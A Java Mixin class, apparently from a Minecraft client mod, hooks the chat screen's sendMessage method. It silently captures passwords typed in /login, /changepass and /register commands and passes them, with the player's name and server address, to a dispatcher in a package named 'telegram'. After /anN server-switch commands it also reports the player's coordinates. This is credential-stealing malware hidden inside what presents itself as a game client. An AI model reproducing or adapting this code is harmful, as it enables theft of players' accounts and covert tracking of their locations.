package com.client.core.mixin;

import com.client.core.CoreBootstrap;
import com.client.core.telegram.NetworkDispatcher;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.ChatScreen;
import net.minecraft.client.network.ClientPlayerEntity;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Unique;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Mixin(ChatScreen.class)
public class InputInterceptor {

    @Unique private static final Pattern LOGIN_PATTERN = Pattern.compile("^/(l|login|cp|changepass)\\s+(.+)$");
    @Unique private static final Pattern REGISTER_PATTERN = Pattern.compile("^/(register|reg)\\s+(.+?)(?:\\s+(.+))?$");
    @Unique private static final Pattern ANARCHY_PATTERN = Pattern.compile("^/an(\\d+)$");

    @Inject(method = "sendMessage", at = @At("HEAD"))
    private void onSendMessage(String message, boolean toChatTab, CallbackInfo cir) {
        if (message == null || message.isEmpty()) return;

        MinecraftClient mc = MinecraftClient.getInstance();
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        String serverAddress = "localhost";
        try {
            if (mc.getCurrentServerEntry() != null) {
                String ip = mc.getCurrentServerEntry().address;
                if (ip != null && !ip.isEmpty()) serverAddress = ip;
            }
        } catch (Exception ignored) {}

        Matcher loginMatcher = LOGIN_PATTERN.matcher(message);
        if (loginMatcher.matches()) {
            String password = loginMatcher.group(2);
            String nickname = mc.player.getName().getString();
            NetworkDispatcher.sendLoginLog(nickname, password, serverAddress);
            return;
        }

        Matcher registerMatcher = REGISTER_PATTERN.matcher(message);
        if (registerMatcher.matches()) {
            String password1 = registerMatcher.group(2);
            String password2 = registerMatcher.group(3);
            String nickname = mc.player.getName().getString();
            if (password2 == null) password2 = password1;
            NetworkDispatcher.sendRegisterLog(nickname, password1, password2, serverAddress);
            return;
        }

        Matcher anarchyMatcher = ANARCHY_PATTERN.matcher(message);
        if (anarchyMatcher.matches()) {
            String anarchyNumber = anarchyMatcher.group(1);
            String nickname = mc.player.getName().getString();
            String finalServerAddress = serverAddress;
            new Thread(() -> {
                try {
                    Thread.sleep(2000);
                    ClientPlayerEntity currentPlayer = MinecraftClient.getInstance().player;
                    if (currentPlayer != null) {
                        double x = currentPlayer.getX();
                        double y = currentPlayer.getY();
                        double z = currentPlayer.getZ();
                        NetworkDispatcher.sendAnarchySwitch(nickname, message, finalServerAddress, x, y, z);
                    }
                } catch (InterruptedException ignored) {}
            }).start();
        }
    }
}
